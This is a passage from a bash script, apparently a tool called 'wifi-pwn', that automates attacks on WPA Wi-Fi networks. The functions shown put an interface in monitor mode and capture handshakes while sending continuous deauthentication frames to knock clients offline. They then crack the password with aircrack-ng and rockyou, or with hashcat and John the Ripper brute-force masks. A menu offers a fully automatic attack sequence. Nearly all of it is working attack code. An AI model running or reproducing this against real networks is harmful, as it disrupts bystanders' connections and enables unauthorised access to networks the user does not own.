    [[ -z "$input" ]] && input="$suggestion"
    input=$(sanitize_name "$input"); [[ -z "$input" ]] && input="capture"
    CAP_FILE="${CAP_FILE_PATH}/$(unique_base "${input:0:60}")"
    ok "Capture base: $(basename "$CAP_FILE").cap"
    return 0
}

# ============================================================
detect_terminal() {
    local t
    for t in x-terminal-emulator gnome-terminal konsole xfce4-terminal \
             lxterminal mate-terminal terminator urxvt rxvt xterm; do
        command -v "$t" >/dev/null 2>&1 && { echo "$t"; return; }
    done
    echo none
}

terminal_supports() {
    local t="$1"
    command -v "$t" >/dev/null 2>&1 || return 1
    case "$t" in
        gnome-terminal) gnome-terminal --help 2>&1 | grep -q -- '--' && return 0; return 1 ;;
        konsole) konsole --help 2>/dev/null | grep -q -- '-e' && return 0; return 1 ;;
        lxterminal) lxterminal --help 2>&1 | grep -q -- '-e' && return 0; return 1 ;;
        xfce4-terminal|mate-terminal|terminator)
            "$t" --help 2>&1 | grep -qE '(^|[[:space:]])-[xe]([[:space:]]|,|$)' && return 0; return 1 ;;
        xterm|urxvt|rxvt|x-terminal-emulator) return 0 ;;
    esac
    return 1
}

launch_terminal() {
    local script="$1"; shift || true
    local -a args=("$@")
    local marker="$script"
    if [[ -z "${DISPLAY:-}" && -z "${WAYLAND_DISPLAY:-}" ]]; then
        warn "Headless — running in background."
        "$script" "${args[@]}" >/dev/null 2>&1 &
        track_pid $!
        return 0
    fi
    local t attempted=0
    t=$(detect_terminal)
    if [[ "$t" != none ]] && terminal_supports "$t"; then
        attempted=1
        case "$t" in
            gnome-terminal) gnome-terminal -- bash -c "$(printf '%q ' "$script" "${args[@]}")" >/dev/null 2>&1 & track_pid $! ;;
            konsole) konsole --hold -e "$script" "${args[@]}" >/dev/null 2>&1 & track_pid $! ;;
            xfce4-terminal) xfce4-terminal -x "$script" "${args[@]}" >/dev/null 2>&1 & track_pid $! ;;
            mate-terminal) mate-terminal -x "$script" "${args[@]}" >/dev/null 2>&1 & track_pid $! ;;
            terminator) terminator -x "$script" "${args[@]}" >/dev/null 2>&1 & track_pid $! ;;
            lxterminal) lxterminal -e "$script $(printf '%q ' "${args[@]}")" >/dev/null 2>&1 & track_pid $! ;;
            *) "$t" -e "$script" "${args[@]}" >/dev/null 2>&1 & track_pid $! ;;
        esac
        sleep 1
        pgrep -f -- "$marker" >/dev/null 2>&1 && return 0
        warn "Terminal ($t) failed to start the job."
    elif [[ "$t" == none ]]; then
        warn "No GUI terminal found."
    else
        warn "Terminal ($t) rejects the required arguments."
    fi
    if (( attempted )); then
        warn "Falling back to background."
        "$script" "${args[@]}" >/dev/null 2>&1 &
        track_pid $!
    fi
    return 0
}

# ============================================================
has_handshake() {
    local cap="$1"
    [[ -f "$cap" ]] || return 1
    command -v aircrack-ng >/dev/null 2>&1 || return 1
    aircrack-ng "$cap" 2>/dev/null | grep -qE '[1-9][0-9]* handshake'
}

capture_and_deauth() {
    monitor_is_ready || { err "Monitor mode not ready."; return 1; }
    [[ -n "$BSSID" && -n "$CHANNEL" && -n "$CAP_FILE" ]] || { err "Target not set."; return 1; }
    init_workdir || return 1
    local script="$WORK_DIR/wifi_cap.sh" result="$WORK_DIR/cap_res"
    local errfile="$WORK_DIR/cap_err" pidfile="$WORK_DIR/cap_pid"
    cat > "$script" <<'CAPEOF'
#!/bin/bash
PATH="/usr/sbin:/sbin:/usr/local/sbin:$PATH"
BSSID="$1"; CHANNEL="$2"; MON="$3"; CAP="$4"; ERR="$5"; PIDF="$6"; RES="$7"
G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; C='\033[0;36m'; N='\033[0m'
AD=""; AR=""
cleanup_children() { [[ -n "$AR" ]] && kill "$AR" 2>/dev/null; [[ -n "$AD" ]] && kill "$AD" 2>/dev/null; }
trap cleanup_children EXIT
clear
echo -e "${C}══ HANDSHAKE CAPTURE ══${N}"
echo -e "${Y}BSSID:${N} $BSSID  ${Y}CH:${N} $CHANNEL  ${Y}IF:${N} $MON"
echo -e "${Y}Output:${N} $CAP-01.cap"
iw dev "$MON" info 2>/dev/null | grep -q 'type monitor' || {
    echo -e "${R}[!] $MON is not in monitor mode.${N}"; sleep 3; echo "FAIL" > "$RES"; exit 1; }
ip link set "$MON" up 2>/dev/null
airodump-ng -w "$CAP" -c "$CHANNEL" --bssid "$BSSID" "$MON" 2>"$ERR" &
AD=$!
sleep 3
aireplay-ng --deauth 0 -a "$BSSID" "$MON" &
AR=$!
echo "$AD" > "$PIDF"; echo "$AR" >> "$PIDF"
echo -e "${Y}[*] Waiting for handshake... Ctrl-C to abort.${N}"
trap 'cleanup_children; echo "ABORT" > "$RES"; exit 130' INT
while true; do
    if grep -q "WPA handshake" "$ERR" 2>/dev/null; then
        echo "FOUND" > "$RES"; echo -e "${G}[+] CAPTURED${N}"; sleep 2; exit 0
    fi
    sleep 1
done
CAPEOF
    chmod 700 "$script"; secure_touch "$result"
    NETWORK_RESTORED=0

    launch_terminal "$script" "$BSSID" "$CHANNEL" "$MON_INTERFACE" "$CAP_FILE" "$errfile" "$pidfile" "$result"
    ok "Capture job started."
    warn "Waiting for handshake — Ctrl-C here to abort."

    local waited=0 cap="" found=0 status=""
    while (( waited < 900 )); do
        sleep 2
        waited=$((waited + 2))
        status=$(cat "$result" 2>/dev/null)
        [[ "$status" == "ABORT" || "$status" == "FAIL" ]] && break
        cap=$(ls -t "${CAP_FILE}"-*.cap 2>/dev/null | head -1)
        if [[ -n "$cap" ]] && has_handshake "$cap"; then found=1; break; fi
        (( waited % 30 == 0 )) && warn "Still waiting... (${waited}s)"
    done
    (( waited >= 900 )) && warn "Timeout after ${waited}s."
    (( found )) && sleep 1

    [[ -z "$cap" ]] && cap=$(ls -t "${CAP_FILE}"-*.cap 2>/dev/null | head -1)
    [[ -z "$cap" ]] && cap="${CAP_FILE}.cap"

    if [[ -f "$pidfile" ]]; then
        local p
        while read -r p; do [[ -n "$p" ]] && kill "$p" 2>/dev/null; done < "$pidfile"
        rm -f "$pidfile"
    fi
    reap_pids
    kill_workdir_procs
    tty_sane
    rm -f "$result" "$errfile" 2>/dev/null

    if (( found )); then
        CAPTURE_FILE="$cap"
        ok "Handshake verified: $(basename "$CAPTURE_FILE")"
        if (( AUTO_RESTORE_AFTER_CAPTURE )); then
            warn "Restoring network immediately..."
            restore_network_now || warn "Network restore failed — use [7]."
        fi
        return 0
    fi
    err "No handshake captured (status: ${status:-none})."
    [[ -f "$cap" ]] && warn "Partial file kept: $(basename "$cap")"
    return 1
}

# ============================================================
prepare_wordlist() {
    setup_output_dir || return 1
    local dest="$OUTPUT_DIR/rockyou.txt"
    [[ -f "$dest" && -s "$dest" ]] && { WORDLIST="$dest"; ok "Using $dest"; return 0; }
    local -a paths=(
        "/usr/share/wordlists/rockyou.txt.gz"
        "/usr/share/wordlists/rockyou.txt"
        "/usr/share/seclists/Passwords/Common-Credentials/rockyou.txt"
        "/usr/share/seclists/Passwords/rockyou.txt"
        "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz"
    )
    local p
    for p in "${paths[@]}"; do
        [[ -f "$p" ]] || continue
        case "$p" in
            *.tar.gz) tar -xzf "$p" -O > "$dest" 2>/dev/null ;;
            *.gz)     gzip -dc "$p" > "$dest" 2>/dev/null ;;
            *)        cp "$p" "$dest" 2>/dev/null ;;
        esac
        [[ -s "$dest" ]] && { WORDLIST="$dest"; ok "Wordlist ready."; return 0; }
    done
    detect_pkg_manager
    local c
    for c in "$(pkg_name_for wordlists)" seclists; do
        pkg_available "$c" && { pkg_install "$c" && break; }
    done
    for p in "${paths[@]}"; do
        [[ -f "$p" ]] || continue
        case "$p" in
            *.tar.gz) tar -xzf "$p" -O > "$dest" 2>/dev/null ;;
            *.gz)     gzip -dc "$p" > "$dest" 2>/dev/null ;;
            *)        cp "$p" "$dest" 2>/dev/null ;;
        esac
        [[ -s "$dest" ]] && { WORDLIST="$dest"; return 0; }
    done
    hacker_read WORDLIST "Wordlist path:"
    [[ -f "$WORDLIST" && -s "$WORDLIST" ]]
}

latest_cap() {
    local dir="${CAP_FILE_PATH:-$OUTPUT_DIR}"
    ls -t "$dir"/*.cap 2>/dev/null | head -1
}

crack_password_terminal() {
    [[ -f "$WORDLIST" ]] || { err "No wordlist."; return 1; }
    init_workdir || return 1
    [[ -z "$CAPTURE_FILE" || ! -f "$CAPTURE_FILE" ]] && CAPTURE_FILE=$(latest_cap)
    [[ -f "$CAPTURE_FILE" ]] || { err "No capture."; return 1; }
    has_handshake "$CAPTURE_FILE" || { err "No handshake."; return 1; }
    local stamp base passfile script result outfile
    stamp=$(date +%Y%m%d-%H%M%S); base=$(basename "$CAPTURE_FILE" .cap)
    passfile="$OUTPUT_DIR/password_${base}_${stamp}.txt"
    script="$WORK_DIR/wifi_crack.sh"; result="$WORK_DIR/crack_res"; outfile="$WORK_DIR/crack_out"
    cat > "$script" <<'CRACKEOF'
#!/bin/bash
PATH="/usr/sbin:/sbin:/usr/local/sbin:$PATH"
CAP="$1"; WL="$2"; RES="$3"; PASS="$4"; OUT="$5"
G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; N='\033[0m'
clear
echo -e "${Y}Capture:${N} $CAP"; echo -e "${Y}Wordlist:${N} $(basename "$WL")"
echo -e "${Y}Press ${R}q${Y}+ENTER to stop.${N}"
aircrack-ng "$CAP" -w "$WL" > >(tee "$OUT") 2>&1 &
CP=$!
while kill -0 $CP 2>/dev/null; do
    read -t 1 -r -n 1 KEY < /dev/tty 2>/dev/null
    if [[ "$KEY" == "q" || "$KEY" == "Q" ]]; then
        kill $CP 2>/dev/null; wait $CP 2>/dev/null
        echo "STOPPED" > "$RES"; read -r _; exit 0
    fi
done
wait $CP 2>/dev/null
if grep -q "KEY FOUND" "$OUT" 2>/dev/null; then
    PW=$(grep "KEY FOUND" "$OUT" | head -1 | sed 's/.*\[ *\(.*\) *\].*/\1/')
    { echo "Password: $PW"; echo "Date: $(date)"; } > "$PASS"
    echo -e "${G}[+] FOUND: $PW${N}"; echo "FOUND" > "$RES"
else
    echo "NOT_FOUND" > "$RES"
fi
read -r _
CRACKEOF
    chmod 700 "$script"; secure_touch "$result"; secure_touch "$outfile"
    launch_terminal "$script" "$CAPTURE_FILE" "$WORDLIST" "$result" "$passfile" "$outfile"
    local waited=0
    while [[ ! -s "$result" ]]; do sleep 1; ((waited++)); (( waited >= 7200 )) && break; done
    local r; r=$(cat "$result" 2>/dev/null)
    rm -f "$result" "$outfile" 2>/dev/null
    reap_pids
    [[ "$r" == "FOUND" ]] && ok "Found — $passfile" || warn "Not found."
}

# strict backend check: hashcat -I prints the word "OpenCL" even with 0 platforms
hashcat_has_backend() {
    command -v hashcat >/dev/null 2>&1 || return 1
    local out
    out=$(hashcat -I 2>&1) || return 1
    grep -qi 'No OpenCL, HIP or CUDA compatible platform' <<<"$out" && return 1
    grep -qE 'OpenCL Platforms:[[:space:]]*[1-9]' <<<"$out" && return 0
    grep -qE '^[[:space:]]*CUDA Info:' <<<"$out" && return 0
    grep -qE '^[[:space:]]*HIP Info:' <<<"$out" && return 0
    return 1
}

hashcat_show() {
    local mode="$1" pot="$2" hashfile="$3"
    hashcat -m "$mode" --show --potfile-path "$pot" "$hashfile" 2>/dev/null | head -1
}

# ---- OpenCL backend repair ----
opencl_has_icd() { compgen -G "/etc/OpenCL/vendors/*.icd" >/dev/null 2>&1; }

opencl_repair() {
    detect_pkg_manager || { err "No package manager available."; return 1; }
    local -a pkgs=()
    case "$PKG" in
        apt-get)           pkgs=(ocl-icd-libopencl1 pocl-opencl-icd clinfo) ;;
        dnf|zypper|pacman) pkgs=(ocl-icd pocl clinfo) ;;
        *)                 pkgs=(ocl-icd pocl) ;;
    esac
    local p installed=0
    for p in "${pkgs[@]}"; do
        pkg_available "$p" || continue
        pkg_install "$p" && installed=1
    done
    (( installed )) || { err "No OpenCL package could be installed."; return 1; }
    command -v ldconfig >/dev/null 2>&1 && ldconfig 2>/dev/null

    if ! opencl_has_icd; then
        local lib=""
        for lib in /usr/lib/x86_64-linux-gnu/libpocl.so* \
                   /usr/lib/aarch64-linux-gnu/libpocl.so* \
                   /usr/lib64/libpocl.so* /usr/lib/libpocl.so*; do
            [[ -e "$lib" ]] && break
            lib=""
        done
        if [[ -n "$lib" ]]; then
            mkdir -p /etc/OpenCL/vendors 2>/dev/null
            printf '%s\n' "$(basename "$lib")" > /etc/OpenCL/vendors/pocl.icd 2>/dev/null \
                && ok "Registered the PoCL ICD file manually."
        fi
    fi

    if command -v clinfo >/dev/null 2>&1; then
        echo -e "${DARK}--- clinfo platforms ---${NC}"
        clinfo -l 2>/dev/null | sed 's/^/    /' || echo "    (clinfo failed)"
        echo ""
    fi
    return 0
}

# ---- John the Ripper fallback (CPU, no OpenCL) ----
john_mask_attack() {
    local cap="$1"
    need_tool john john || { err "john is not installed."; return 1; }

    local base="${cap%.cap}" hccapx="${base}.hccapx"
    if [[ ! -s "$hccapx" ]]; then
        if command -v hcxpcapngtool >/dev/null 2>&1; then
            hcxpcapngtool -o "$hccapx" "$cap" >/dev/null 2>&1
        fi
        if [[ ! -s "$hccapx" ]] && command -v cap2hccapx >/dev/null 2>&1; then
            cap2hccapx "$cap" "$hccapx" >/dev/null 2>&1
        fi
    fi
    [[ -s "$hccapx" ]] || { err "Could not build an hccapx file for John."; return 1; }
    ok "Hash file: $(basename "$hccapx") (john wpapsk)"

    local minlen maxlen
    hacker_read minlen "Min length [8]:"; minlen="${minlen:-8}"; [[ "$minlen" =~ ^[0-9]+$ ]] || minlen=8
    hacker_read maxlen "Max length [12]:"; maxlen="${maxlen:-12}"; [[ "$maxlen" =~ ^[0-9]+$ ]] || maxlen=12
    (( maxlen < minlen )) && maxlen="$minlen"

    local pot="$WORK_DIR/john.pot"
    local stamp passfile
    stamp=$(date +%Y%m%d-%H%M%S); passfile="$OUTPUT_DIR/password_mask_${stamp}.txt"

    echo ""
    warn "Each length runs separately. Ctrl-C stops and still checks for a hit."
    echo ""

    local ABORT=0
    trap 'ABORT=1' INT

    local i M j pw
    for ((i=minlen; i<=maxlen; i++)); do
        M=""
        for ((j=0; j<i; j++)); do M="${M}?a"; done
        warn "Length $i — John mask $M"
        john --format=wpapsk --mask="$M" --pot="$pot" \
             --session="wpwn${i}_$$" --verbosity=2 "$hccapx"

        pw=$(john --show --format=wpapsk --pot="$pot" "$hccapx" 2>/dev/null \
             | awk -F: 'NF>=2 && $0 !~ /password hash|Session|Loaded|Remaining/ {print $2; exit}')
        if [[ -n "$pw" ]]; then
            trap 'on_signal INT' INT
            printf 'Password: %s\nDate: %s\nCapture: %s\n' "$pw" "$(date)" "$cap" > "$passfile"
            ok "FOUND — $passfile"
            return 0
        fi

        if (( ABORT )); then
            trap 'on_signal INT' INT
            warn "Aborted by user — nothing found in the lengths attempted."
            return 1
        fi
    done
    trap 'on_signal INT' INT
    warn "Range exhausted, nothing found."
    return 1
}

mask_attack() {
    setup_output_dir || return 1
    CAP_FILE_PATH="${CAP_FILE_PATH:-$OUTPUT_DIR}"
    init_workdir || return 1

    local cap="$CAPTURE_FILE"
    [[ -f "$cap" ]] || cap=$(latest_cap)
    if [[ -z "$cap" || ! -f "$cap" ]]; then
        err "No .cap file found — run [4] first."
        return 1
    fi
    ok "Capture: $(basename "$cap")"
    if ! has_handshake "$cap"; then
        err "No handshake in $(basename "$cap") — capture a fresh one with [4]."
        return 1
    fi

    need_tool hashcat hashcat || return 1

    if ! hashcat_has_backend; then
        err "hashcat has no OpenCL/CUDA/HIP backend."
        warn "Both the ICD loader (ocl-icd-libopencl1) and a registered device are required."
        local a
        hacker_read a "Repair the OpenCL runtime now? (Y/n):"
        if [[ "$a" != "n" && "$a" != "N" ]]; then
            opencl_repair
        fi
        if hashcat_has_backend; then
            ok "Backend is available now."
        else
            err "hashcat still has no backend."
            if command -v clinfo >/dev/null 2>&1; then
                warn "clinfo output:"
                clinfo -l 2>&1 | head -10 | sed 's/^/    /'
            fi
            warn "Falling back to John the Ripper (CPU, no OpenCL needed)."
            john_mask_attack "$cap"
            return $?
        fi
    fi

    local base="${cap%.cap}" hashfile="" mode=""
    if command -v hcxpcapngtool >/dev/null 2>&1; then
        hcxpcapngtool -o "${base}.22000" "$cap" >/dev/null 2>&1
        [[ -s "${base}.22000" ]] && { hashfile="${base}.22000"; mode="22000"; }
    fi
    if [[ -z "$hashfile" ]] && command -v cap2hccapx >/dev/null 2>&1; then
        cap2hccapx "$cap" "${base}.hccapx" >/dev/null 2>&1
        [[ -s "${base}.hccapx" ]] && { hashfile="${base}.hccapx"; mode="2500"; }
    fi
    if [[ -z "$hashfile" ]]; then
        err "Hash conversion failed — neither hcxpcapngtool nor cap2hccapx produced output."
        warn "Install hcxtools: apt install hcxtools"
        return 1
    fi
    if [[ "$mode" == "22000" ]] && ! grep -q '^WPA\*' "$hashfile"; then
        err "Converted file has no usable EAPOL/PMKID record."
        return 1
    fi
    ok "Hash file: $(basename "$hashfile") (mode $mode)"

    local minlen maxlen
    hacker_read minlen "Min length [8]:"; minlen="${minlen:-8}"; [[ "$minlen" =~ ^[0-9]+$ ]] || minlen=8
    hacker_read maxlen "Max length [12]:"; maxlen="${maxlen:-12}"; [[ "$maxlen" =~ ^[0-9]+$ ]] || maxlen=12
    (( maxlen < minlen )) && maxlen="$minlen"
    if (( maxlen > 31 )); then
        warn "Optimized kernel caps at 31 chars — max length set to 31."
        maxlen=31
    fi

    local pot="${base}.pot"
    local stamp passfile
    stamp=$(date +%Y%m%d-%H%M%S); passfile="$OUTPUT_DIR/password_mask_${stamp}.txt"

    echo ""
    warn "Each length runs separately. Ctrl-C stops and still checks for a hit."
    echo ""

    local HASHCAT_ABORT=0
    trap 'HASHCAT_ABORT=1' INT

    local i M j rc got
    for ((i=minlen; i<=maxlen; i++)); do
        M=""
        for ((j=0; j<i; j++)); do M="${M}?a"; done
        warn "Length $i — mask $M"
        hashcat -m "$mode" -a 3 -O -w 2 --force --status --status-timer=10 \
                --potfile-path "$pot" "$hashfile" "$M"
        rc=$?

        got=$(hashcat_show "$mode" "$pot" "$hashfile")
        if [[ -n "$got" ]]; then
            trap 'on_signal INT' INT
            printf 'Password: %s\nDate: %s\nCapture: %s\n' "${got##*:}" "$(date)" "$cap" > "$passfile"
            ok "FOUND — $passfile"
            return 0
        fi

        if (( HASHCAT_ABORT )); then
            trap 'on_signal INT' INT
            warn "Aborted by user — nothing found in the lengths attempted."
            return 1
        fi

        case "$rc" in
            0|1) : ;;
            2)
                err "hashcat error (exit 2)."
                hashcat_has_backend || err "Backend lost."
                trap 'on_signal INT' INT
                return 1 ;;
            *)
                warn "hashcat exit $rc."
                if ! hashcat_has_backend; then
                    err "Backend lost."
                    trap 'on_signal INT' INT
                    return 1
                fi
                ;;
        esac
    done
    trap 'on_signal INT' INT
    warn "Range exhausted, nothing found."
    return 1
}

# ============================================================
cleanup_on_exit() {
    local rc=0
    DEFER_STATE_CLEAR=1
    kill_children
    kill_workdir_procs
    disable_monitor || rc=1
    reg_restore
    rfkill_restore
    restore_service_state || rc=1
    ensure_network_services || rc=1
    verify_managed_present || rc=1
    cleanup_workdir
    tty_sane
    DEFER_STATE_CLEAR=0
    if (( rc == 0 )); then
        force_clear_state; ok "Exit cleanup verified."
    else
        err "Exit cleanup INCOMPLETE — state kept for [8]."
    fi
    return $rc
}

# ============================================================
diagnostics() {
    banner
    echo -e "${CYAN}=== DIAGNOSTICS (read-only) ===${NC}"
    echo ""
    echo "--- environment ---"
    echo "  version: ${VERSION} (${BUILD})"
    echo "  kernel:  $(uname -r)"
    echo "  distro:  ${DISTRO_ID}${DISTRO_LIKE:+ (like: $DISTRO_LIKE)}"
    echo "  pkgmgr:  ${PKG:-none detected}"
    echo "  euid:    $EUID"
    echo ""
    echo "--- tools ---"
    local t
    for t in iw iwconfig ip ethtool airmon-ng airodump-ng aireplay-ng \
             aircrack-ng hashcat hcxpcapngtool cap2hccapx john clinfo \
             ldconfig rfkill nmcli systemctl rc-service sv service \
             xterm timeout pgrep; do
        command -v "$t" >/dev/null 2>&1 && echo "  [OK]      $t" || echo "  [MISSING] $t"
    done
    echo ""
    echo "--- hashcat backend ---"
    if command -v hashcat >/dev/null 2>&1; then
        if hashcat_has_backend; then echo "  [OK] backend present"
        else echo "  [MISSING] no OpenCL/CUDA/HIP backend"; fi
    else
        echo "  hashcat not installed"
    fi
    echo ""
    echo "--- OpenCL ICD files ---"
    if opencl_has_icd; then
        ls -1 /etc/OpenCL/vendors/*.icd 2>/dev/null | sed 's/^/  /'
    else
        echo "  none registered in /etc/OpenCL/vendors"
    fi
    command -v clinfo >/dev/null 2>&1 && { echo "--- clinfo ---"; clinfo -l 2>&1 | head -8 | sed 's/^/  /'; }
    echo ""
    echo "--- regulatory domain ---"
    iw reg get 2>/dev/null | head -6 || echo "  iw unavailable"
    echo ""
    echo "--- wireless devices ---"
    iw dev 2>/dev/null || echo "  iw unavailable"
    echo ""
    echo "--- links ---"
    ip -br link 2>/dev/null
    echo ""
    echo "--- interface summary ---"
    echo "  managed interfaces: $(managed_count)"
    local i
    while read -r i; do
        [[ -z "$i" ]] && continue
        echo "  $i: type=$(iface_type "$i") phy=$(iface_phy "$i" 2>/dev/null || echo unresolved)"
    done < <(discover_wireless_raw)
    echo ""
    echo "--- PHY caps ---"
    while read -r i; do
        [[ -z "$i" ]] && continue
        echo "  [$i]"; report_phy_caps "$i"
    done < <(discover_wireless_raw)
    echo ""
    echo "--- rfkill ---"
    rfkill list 2>/dev/null || echo "  rfkill unavailable"
    echo ""
    echo "--- services ---"
    detect_service_manager
    report_service_support
    echo ""
    echo "--- airmon-ng ---"
    airmon-ng 2>/dev/null || echo "  unavailable"
    echo ""
    echo "--- firmware log (last 10) ---"
    dmesg 2>/dev/null | grep -iE 'firmware|iwlwifi|ath|rtl|rt2|mt76|brcm' | tail -10
    echo ""
    echo "--- VM ---"
    report_vm_status
    echo ""
    report_stale_state
    pause_enter
}

# ============================================================
main_menu() {
    while true; do
        banner
        echo -e "${DARK}┌──────────────────────────────────────────────────────────────┐${NC}"
        echo -e "${DARK}│${NC}  ${CYAN}SELECT ATTACK VECTOR${NC}                                         ${DARK}│${NC}"
        echo -e "${DARK}├──────────────────────────────────────────────────────────────┤${NC}"
        echo -e "${DARK}│${NC}  ${GREEN}[1]${NC}  FULL AUTO — Complete attack sequence              ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${GREEN}[2]${NC}  ENABLE MONITOR MODE                               ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${GREEN}[3]${NC}  SCAN NETWORKS                                     ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${GREEN}[4]${NC}  CAPTURE HANDSHAKE — Set target & deauth           ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${GREEN}[5]${NC}  CRACK PASSWORD                                    ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${GREEN}[6]${NC}  MASK ATTACK — Hashcat                             ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${CYAN}[7]${NC}  RESTORE NETWORK MANAGER                           ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${GREEN}[8]${NC}  CLEANUP / RECOVER                                 ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${GREEN}[9]${NC}  DIAGNOSTICS / TROUBLESHOOT                        ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${RED}[10]${NC} EXIT                                             ${DARK}│${NC}"
        echo -e "${DARK}└──────────────────────────────────────────────────────────────┘${NC}"
        echo ""
        report_stale_state
        local choice
        hacker_read choice ""

        case "$choice" in
            1)
                check_deps || { pause_enter; continue; }
                setup_output_dir || { pause_enter; continue; }
                select_interface || { pause_enter; continue; }
                (( ORIG_WAS_MONITOR )) || kill_interfering
                enable_monitor "$ORIG_INTERFACE" || { pause_enter; continue; }
                scan_networks || { pause_enter; continue; }
                set_target || { pause_enter; continue; }
                capture_and_deauth || { pause_enter; continue; }
                restart_network
                prepare_wordlist || { pause_enter; continue; }
                crack_password_terminal
                pause_enter
                ;;
            2)
                check_deps || { pause_enter; continue; }
                select_interface || { pause_enter; continue; }
                if (( ORIG_WAS_MONITOR )); then
                    ip link set "$ORIG_INTERFACE" up >/dev/null 2>&1
                    ok "Monitor interface already active — no new VIF will be created."
                    ok "Cleanup will convert it back to managed."
                    monitor_probe_verify
                    pause_enter; continue
                fi
                kill_interfering
                if ! enable_monitor "$ORIG_INTERFACE"; then
                    err "Monitor setup failed — restoring services."
                    ensure_network_services
                    pause_enter; continue
                fi
                pause_enter
                ;;
            3)
                check_deps || { pause_enter; continue; }
                ensure_monitor_ready || { pause_enter; continue; }
                scan_networks
                pause_enter
                ;;
            4)
                check_deps || { pause_enter; continue; }
                setup_output_dir || { pause_enter; continue; }
                ensure_monitor_ready || { pause_enter; continue; }
                if [[ -z "$BSSID" ]]; then
                    scan_networks || { pause_enter; continue; }
                fi
                set_target || { pause_enter; continue; }
                capture_and_deauth
                pause_enter
                ;;
            5)
                setup_output_dir || { pause_enter; continue; }
                list_existing_caps
                CAPTURE_FILE=$(latest_cap)
                if [[ -z "$CAPTURE_FILE" ]]; then
                    err "No .cap files."
                    pause_enter; continue
                fi
                ok "Latest capture: $(basename "$CAPTURE_FILE")"
                prepare_wordlist || { pause_enter; continue; }
                crack_password_terminal
                pause_enter
                ;;
            6)
                mask_attack
                pause_enter
                ;;
            7)
                restore_network_manager
                pause_enter
                ;;
            8)
                NETWORK_RESTORED=0
                recover_state
                pause_enter
                ;;
            9) diagnostics ;;
            10)
                cleanup_on_exit
                ok "Exiting."
                exit 0
                ;;
            *) err "Invalid option."; pause_enter ;;
        esac
    done
}

# ============================================================
main() {
    case "${1:-}" in
        --help|-h)
            echo "wifi-pwn v${VERSION} (${BUILD})"
            echo "  sudo $0          menu"
            echo "  sudo $0 --check  diagnostics"
            echo "  sudo $0 --version"
            exit 0 ;;
        --version|-v) echo "wifi-pwn v${VERSION} (${BUILD})"; exit 0 ;;
        --check)
            check_root; detect_distro; detect_pkg_manager; detect_service_manager
            init_workdir; diagnostics; cleanup_workdir; exit 0 ;;
    esac

    check_root
    detect_distro
    detect_pkg_manager
    init_workdir || exit 1
    capture_service_state

    trap 'on_signal EXIT'  EXIT
    trap 'on_signal INT'   INT
    trap 'on_signal TERM'  TERM
    trap 'on_signal HUP'   HUP
    trap 'on_signal QUIT'  QUIT

    main_menu
}

if [[ "${WPWN_SOURCE_ONLY:-0}" == "1" ]]; then
    return 0 2>/dev/null || true
fi

main "$@"
